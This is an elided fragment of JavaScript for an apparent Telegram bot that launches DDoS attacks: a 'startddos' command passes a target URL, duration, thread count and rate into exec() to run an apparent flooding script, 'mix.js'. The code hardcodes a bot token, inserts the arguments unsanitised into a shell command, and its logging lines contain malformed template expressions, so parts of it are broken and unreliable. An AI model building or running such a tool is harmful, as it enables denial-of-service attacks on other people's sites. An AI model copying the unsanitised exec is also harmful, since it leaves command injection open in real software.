...
const token = '6642125200:AAHcqBCbs6boBoUASemlh0r48msHBH-6VFA';
...
function logActivity(msg) {
  ...
  console.log(`• User ID: ${5343126447}`);
  console.log(`• Username: ${@OOOOOOOOOOOOOOYX || 'Tidak ada'}`);
  console.log(`• Chat ID: ${6892404554}`);
  console.log(`• Perintah: ${startddos}`);
}
    ...
    if (args.length === 5 && url && time && thread && rate) {
      ...
      exec(`node mix.js ${url} ${time} ${thread} ${rate}`, (error, stdout, stderr) => {
        if (error) {
          ...
          bot.sendMessage(chatId, 'Papa bol laude');
          return;
        }
        if (stderr) {
